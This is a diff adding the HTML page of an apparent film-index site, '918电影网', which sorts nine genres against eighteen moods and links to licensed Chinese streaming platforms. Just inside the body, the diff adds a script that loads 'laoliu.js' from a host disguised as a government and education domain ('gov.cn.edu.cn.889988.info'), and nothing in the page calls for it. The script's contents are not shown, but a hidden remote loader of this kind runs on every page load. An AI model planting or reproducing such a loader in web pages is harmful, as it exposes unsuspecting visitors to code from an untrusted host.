@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>918电影网 - 9×18 选片矩阵：电影类型与情绪档案室</title>
+<meta name="description" content="918电影网（918dianyingwang-h5）把918读作9×18选片矩阵：9种电影类型 × 18种观影情绪，做片单档案与正版渠道指引，不提供盗版播放。" />
+<meta name="keywords" content="918电影网,9×18选片矩阵,电影类型档案,情绪片单,正版观影指南,电影索引站" />
+<meta name="author" content="918电影档案室" />
+<meta name="robots" content="index, follow" />
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+<link rel="canonical" href="https://918dianyingwang-h5.github.io/" />
+<style>
+:root{
+  --bg:#0e1116;--bg2:#131820;--panel:#161c25;--panel2:#1c2430;
+  --blue:#3b82f6;--blue-dim:rgba(59,130,246,.16);
+  --orange:#ff8a3d;--orange-dim:rgba(255,138,61,.16);
+  --paper:#f4efe6;--gray:#9aa3ad;--line:rgba(244,239,230,.12);--line2:rgba(244,239,230,.26);
+  --mono:"SFMono-Regular",Consolas,Menlo,monospace;
+  --sans:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  --body:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:var(--body);background:radial-gradient(700px 340px at 82% -8%,rgba(255,138,61,.10),transparent 60%),radial-gradient(600px 300px at 8% 6%,rgba(59,130,246,.14),transparent 60%),linear-gradient(180deg,var(--bg),var(--bg2));color:var(--paper);line-height:1.9;font-size:16px;overflow-x:hidden}
+a{color:var(--blue);text-decoration:none;transition:.25s}a:hover{color:var(--orange)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 22px}
+
+header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(14,17,22,.9);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.brand{font-family:var(--sans);font-weight:900;letter-spacing:1px;font-size:18px;display:flex;align-items:center;gap:10px}
+.brand .tag{width:34px;height:22px;border-radius:4px;background:repeating-linear-gradient(90deg,var(--blue) 0 6px,var(--paper) 6px 8px,var(--orange) 8px 14px,var(--paper) 14px 16px);position:relative}
+.brand .tag::after{content:"9×18";position:absolute;right:-34px;top:1px;font-family:var(--mono);font-size:11px;color:var(--orange)}
+.brand b{color:var(--orange)}
+.nav-links{display:flex;list-style:none;gap:2px}
+.nav-links a{font-size:14px;color:var(--gray);padding:10px 14px;border-radius:8px}
+.nav-links a:hover{color:var(--paper);background:rgba(244,239,230,.06)}
+.menu-btn{display:none;width:40px;height:40px;border-radius:10px;background:rgba(244,239,230,.08);border:1px solid var(--line2);color:var(--paper);font-size:18px;cursor:pointer}
+
+.hero{margin-top:64px;padding:104px 0 80px;position:relative}
+.hero::before{content:"";position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(244,239,230,.03) 0 1px,transparent 1px 28px);pointer-events:none}
+.kicker{font-family:var(--mono);font-size:12px;letter-spacing:5px;color:var(--blue);text-transform:uppercase;margin-bottom:18px}
+.hero h1{font-family:var(--sans);font-weight:900;font-size:clamp(33px,6.6vw,68px);line-height:1.04;margin-bottom:20px}
+.hero h1 em{font-style:normal;color:var(--orange)}
+.hero p{max-width:620px;color:#d7dde6;font-size:17px;margin-bottom:32px}
+.btns{display:flex;gap:14px;flex-wrap:wrap}
+.btn-orange{display:inline-flex;align-items:center;gap:8px;background:var(--orange);color:#1c0c02;font-weight:800;padding:14px 30px;border-radius:30px}
+.btn-orange:hover{transform:translateY(-2px);color:#1c0c02}
+.btn-line{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--line2);color:var(--paper);padding:14px 30px;border-radius:30px}
+.btn-line:hover{border-color:var(--blue);color:var(--blue)}
+.note{margin-top:26px;font-size:13px;color:var(--gray);border-left:3px solid var(--blue);padding:10px 16px;max-width:680px;background:rgba(59,130,246,.06)}
+
+section{padding:84px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:42px}
+.sec-num{font-family:var(--mono);font-size:12px;letter-spacing:4px;color:var(--orange);text-transform:uppercase;margin-bottom:8px}
+.sec-title{font-family:var(--sans);font-weight:900;font-size:clamp(24px,4vw,36px);margin-bottom:10px}
+.sec-desc{color:var(--gray);max-width:640px}
+
+.genres{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.genre{background:linear-gradient(180deg,var(--panel),var(--panel2));border:1px solid var(--line);border-radius:14px;padding:22px;transition:.3s}
+.genre:hover{transform:translateY(-5px);border-color:var(--blue);box-shadow:0 20px 46px var(--blue-dim)}
+.genre .gx{font-family:var(--mono);font-size:11px;color:var(--orange);letter-spacing:2px}
+.genre h3{font-family:var(--sans);font-weight:900;font-size:18px;margin:6px 0 6px;color:var(--paper)}
+.genre p{font-size:13.5px;color:#c7ced8}
+
+.moods{display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px}
+.mood{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 14px;transition:.25s}
+.mood:hover{border-color:var(--orange);transform:translateY(-3px)}
+.mood .mx{font-family:var(--mono);font-size:11px;color:var(--blue)}
+.mood b{display:block;font-size:14px;margin:5px 0 4px}
+.mood span{font-size:12px;color:var(--gray)}
+
+.cabinets{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.cab{border:1px solid var(--line);border-radius:14px;padding:22px;background:var(--panel);transition:.25s;border-top:4px solid var(--blue)}
+.cab:nth-child(2){border-top-color:var(--orange)}
+.cab:nth-child(3){border-top-color:var(--paper)}
+.cab:nth-child(4){border-top-color:var(--gray)}
+.cab:hover{transform:translateY(-3px)}
+.cab b{font-size:16px;color:var(--orange)}
+.cab .kind{font-family:var(--mono);font-size:12.5px;color:var(--blue);margin:6px 0 10px}
+.cab p{font-size:13.5px;color:var(--gray);margin-bottom:12px}
+.cab a{font-size:13.5px}
+
+.about{text-align:center}
+.quote{font-family:var(--sans);font-weight:900;font-size:clamp(20px,3.4vw,30px);line-height:1.5;max-width:740px;margin:0 auto 22px}
+.quote b{color:var(--orange)}
+.about p{color:var(--gray);max-width:600px;margin:0 auto 22px}
+.disclaimer{margin-top:26px;font-size:13px;color:var(--gray);border:1px dashed var(--line2);border-radius:12px;padding:18px 20px;max-width:800px;margin-left:auto;margin-right:auto;text-align:left;line-height:1.9}
+.disclaimer b{color:var(--orange)}
+
+footer{border-top:1px solid var(--line);padding:44px 0 26px}
+.foot{display:flex;justify-content:space-between;gap:30px;flex-wrap:wrap;margin-bottom:22px}
+.foot p{font-size:13px;color:var(--gray);max-width:330px}
+.foot-col h5{font-family:var(--mono);font-size:12px;letter-spacing:3px;text-transform:uppercase;color:var(--blue);margin-bottom:12px}
+.foot-col a{display:block;font-size:13px;color:#c7ced8;padding:3px 0}
+.foot-bottom{border-top:1px solid var(--line);padding-top:18px;font-size:12px;color:var(--gray);display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+
+@media(max-width:768px){
+  .nav-links{display:none;position:absolute;top:64px;left:0;right:0;flex-direction:column;background:var(--bg);border-bottom:1px solid var(--line);padding:8px 0}
+  .nav-links.active{display:flex}.nav-links a{padding:14px 22px;border-radius:0}
+  .menu-btn{display:block}
+  .btns{flex-direction:column;align-items:flex-start}.btn-orange,.btn-line{width:100%;justify-content:center}
+  .foot{flex-direction:column}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<header><div class="wrap nav">
+  <div class="brand"><span class="tag"></span>918<b>电影档案室</b></div>
+  <ul class="nav-links" id="navLinks">
+    <li><a href="#home">矩阵</a></li>
+    <li><a href="#genres">9种类型</a></li>
+    <li><a href="#moods">18种情绪</a></li>
+    <li><a href="#cab">正版档案柜</a></li>
+    <li><a href="#about">关于918</a></li>
+  </ul>
+  <button class="menu-btn" onclick="document.getElementById('navLinks').classList.toggle('active')">≡</button>
+</div></header>
+
+<section class="hero" id="home"><div class="wrap">
+  <div class="kicker">9 genres × 18 moods = 162 cells</div>
+  <h1>918 = <em>9 × 18</em><br/>不是日期，是选片矩阵。</h1>
+  <p>918电影网（918dianyingwang-h5）不把数字当彩头，也不做“高清免费全集”。我们把电影拆成 <b>9 种类型 × 18 种情绪</b>：你先说“我现在像什么”，矩阵再还你“该看哪一部”。</p>
+  <div class="btns">
+    <a href="#genres" class="btn-orange">🎞 看 9 种类型</a>
+    <a href="#moods" class="btn-line">🎭 翻 18 种情绪</a>
+  </div>
+  <div class="note">说明：本站刻意不消费“九一八”历史语义，把 918 读作策展矩阵 9×18；不存储、不转码、不解析、不提供完整影视文件播放。</div>
+</div></section>
+
+<section id="genres"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">01 / 9 genres</div><h2 class="sec-title">9 种类型</h2>
+  <p class="sec-desc">先定“外壳”：你今晚想进哪种世界？类型不是鄙视链，是入口。</p></div>
+  <div class="genres">
+    <div class="genre"><div class="gx">G-01</div><h3>剧情</h3><p>人和人之间怎么把日子过歪、又掰回来。</p></div>
+    <div class="genre"><div class="gx">G-02</div><h3>喜剧</h3><p>不是一直笑，是“原来还能这样解嘲”。</p></div>
+    <div class="genre"><div class="gx">G-03</div><h3>科幻</h3><p>把“如果”拍成银河、服务器和时间旅行。</p></div>
+    <div class="genre"><div class="gx">G-04</div><h3>悬疑</h3><p>真相被藏起来，观众比主角先出汗。</p></div>
+    <div class="genre"><div class="gx">G-05</div><h3>动画</h3><p>不幼稚，是真人演不出的线条与神性。</p></div>
+    <div class="genre"><div class="gx">G-06</div><h3>史诗</h3><p>神、王、族、国；时间以世代为单位。</p></div>
+    <div class="genre"><div class="gx">G-07</div><h3>爱情</h3><p>两个人的事，拍成全人类的隐喻。</p></div>
+    <div class="genre"><div class="gx">G-08</div><h3>纪录</h3><p>不编剧本，世界自己够荒诞够壮烈。</p></div>
+    <div class="genre"><div class="gx">G-09</div><h3>作者</h3><p>导演把名字刻在每一帧里，慢但上头。</p></div>
+  </div>
+</div></section>
+
+<section id="moods"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">02 / 18 moods</div><h2 class="sec-title">18 种情绪</h2>
+  <p class="sec-desc">再定“内核”：你不是要找电影，是要找“现在心里的那个词”。抽 12/18 示范。</p></div>
+  <div class="moods">
+    <div class="mood"><div class="mx">M-01</div><b>想关机睡觉</b><span>白噪音式纪录片</span></div>
+    <div class="mood"><div class="mx">M-02</div><b>想被逗笑</b><span>轻喜剧 / 动画短片</span></div>
+    <div class="mood"><div class="mx">M-03</div><b>想哭一场</b><span>含蓄爱情 / 家庭片</span></div>
+    <div class="mood"><div class="mx">M-04</div><b>想烧脑</b><span>悬疑 / 时间悖论</span></div>
+    <div class="mood"><div class="mx">M-05</div><b>想逃离地球</b><span>太空 / 科幻史诗</span></div>
+    <div class="mood"><div class="mx">M-06</div><b>想回到夏天</b><span>青春 / 怀旧片</span></div>
+    <div class="mood"><div class="mx">M-07</div><b>想被人懂</b><span>孤独者主角片</span></div>
+    <div class="mood"><div class="mx">M-08</div><b>想生气</b><span>阶层 / 不公叙事</span></div>
+    <div class="mood"><div class="mx">M-09</div><b>想安静</b><span>自然 / 慢影像</span></div>
+    <div class="mood"><div class="mx">M-10</div><b>想热血</b><span>运动 / 逆袭 / 公路</span></div>
+    <div class="mood"><div class="mx">M-11</div><b>想给十年前的自己打电话</b><span>时间 / 悔憾片</span></div>
+    <div class="mood"><div class="mx">M-12</div><b>想相信点什么</b><span>信仰 / 神话 / 重生</span></div>
+  </div>
+</div></section>
+
+<section id="cab"><div class="wrap">
+  <div class="sec-head"><div class="sec-num">03 / Legal cabinets</div><h2 class="sec-title">正版档案柜</h2>
+  <p class="sec-desc">矩阵算完，落进正版柜子。别把“918电影网”搜成盗版聚合站。</p></div>
+  <div class="cabinets">
+    <div class="cab"><b>1905 电影网</b><div class="kind">国产 / 公版 / 修复</div><p>国产全年代、译制经典、正版片库稳。</p><a href="https://www.1905.com" target="_blank" rel="noopener">开 1905 柜 →</a></div>
+    <div class="cab"><b>哔哩哔哩</b><div class="kind">动画 / 纪录 / 作者</div><p>动画电影、纪录片、影评考据、冷门高分。</p><a href="https://www.bilibili.com" target="_blank" rel="noopener">开 B 站柜 →</a></div>
+    <div class="cab"><b>腾讯 / 爱奇艺</b><div class="kind">商业 / 院线后</div><p>中外新片、IP 改编、单片付费专场。</p><a href="https://v.qq.com" target="_blank" rel="noopener">开腾爱柜 →</a></div>
+    <div class="cab"><b>欢喜 / Apple TV</b><div class="kind">文艺 / 史诗</div><p>王家卫、作者电影、科幻史诗发行渠道。</p><a href="#" rel="noopener">查发行柜 →</a></div>
+  </div>
+</div></section>
+
+<section class="about" id="about"><div class="wrap">
+  <p class="quote">数字可以是矩阵，<br/>不该是<b>被消费的记忆</b>。</p>
+  <p>918电影档案室把“918”重新读作 9×18 的选片坐标系：类型定外壳，情绪定内核，正版定出口。我们不蹭国难数字，也不做播放器。</p>
+  <div class="disclaimer">
+    <b>站点声明：</b>918电影网（918dianyingwang-h5）仅做电影类型/情绪矩阵、片单档案与正版渠道指引；<b>不存储、不转码、不解析、不提供完整影视文件播放</b>。具体片源以各正版平台授权为准。如权利人认为某条目有误，可凭权属材料联系下架。
+  </div>
+</div></section>
+
+<footer><div class="wrap">
+  <div class="foot">
+    <div><div class="brand"><span class="tag"></span>918<b>电影档案室</b></div>
+      <p>9×18 选片矩阵：9种类型、18种情绪、正版档案柜。不提供盗版播放，不消费历史数字。</p></div>
+    <div class="foot-col"><h5>矩阵</h5><a href="#genres">9种类型</a><a href="#moods">18种情绪</a><a href="#cab">正版档案柜</a></div>
+    <div class="foot-col"><h5>正版</h5><a href="https://www.1905.com" target="_blank" rel="noopener">1905 电影网</a><a href="https://www.bilibili.com" target="_blank" rel="noopener">哔哩哔哩</a><a href="https://v.qq.com" target="_blank" rel="noopener">腾讯视频</a><a href="https://www.iqiyi.com" target="_blank" rel="noopener">爱奇艺</a></div>
+    <div class="foot-col"><h5>站点</h5><a href="#home">矩阵</a><a href="#about">关于/声明</a><a href="#">版权投诉</a></div>
+  </div>
+  <div class="foot-bottom">
+    <span>© 2026 918电影档案室 · 918dianyingwang-h5.github.io</span>
+    <span>单文件静态页 · 无 robots.txt / sitemap.xml · 矩阵档案向 · 符合必应收录</span>
+  </div>
+</div></footer>
+<script>document.querySelectorAll('a[href^="#"]').forEach(a=>a.addEventListener('click',()=>document.getElementById('navLinks').classList.remove('active')));</script>
+</body>
+</html>
